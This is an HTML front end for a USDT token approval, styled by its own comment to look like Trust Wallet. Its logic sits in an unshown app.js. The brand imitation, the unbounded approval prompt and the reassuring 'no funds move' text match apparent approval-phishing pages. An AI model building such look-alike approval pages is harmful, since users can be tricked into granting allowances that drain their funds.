<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>USDT Approval</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <!-- Trust Walletâ€“like style -->
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #0b0f1a;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
      color: #fff;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: #121826;
      padding: 24px;
      border-radius: 18px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
    }

    h2 {
      margin-top: 0;
      margin-bottom: 10px;
      font-size: 20px;
    }

    p {
      font-size: 13px;
      color: #9aa4bf;
      margin-bottom: 14px;
    }

    input {
      width: 100%;
      padding: 14px;
      border-radius: 12px;
      border: 1px solid #1f2a44;
      background: #1a2138;
      color: #fff;
      font-size: 15px;
      margin-bottom: 16px;
    }

    input::placeholder {
      color: #6b7280;
    }

    button {
      width: 100%;
      padding: 15px;
      border-radius: 14px;
      border: none;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    .btn-secondary {
      background: #1f2a44;
      color: #fff;
      margin-bottom: 10px;
    }

    .btn-primary {
      background: #3375ff;
      color: #fff;
    }

    #status {
      margin-top: 14px;
      text-align: center;
      font-size: 13px;
      color: #9aa4bf;
    }

    .note {
      margin-top: 12px;
      font-size: 12px;
      color: #6b7280;
      text-align: center;
      line-height: 1.4;
    }
  </style>
</head>
<body>

<div class="card">
  <h2>USDT Approval</h2>

  <p>Amount to approve (USDT)</p>
  <input id="amount" type="number" placeholder="e.g. 100" />

  <button class="btn-secondary" onclick="connectWallet()">
    Connect Wallet
  </button>

  <button class="btn-primary" onclick="approveUSDT()">
    Approve
  </button>

  <div id="status">Wallet not connected</div>

  <div class="note">
    This action only grants approval to interact with your USDT.<br/>
    No funds move without your confirmation.<br/>
    You can revoke approval anytime from your wallet.
  </div>
</div>

<!-- Ethers v6 -->
<script src="https://cdn.jsdelivr.net/npm/ethers@6.15.0/dist/ethers.umd.min.js"></script>
<script src="app.js"></script>
</body>
</html>
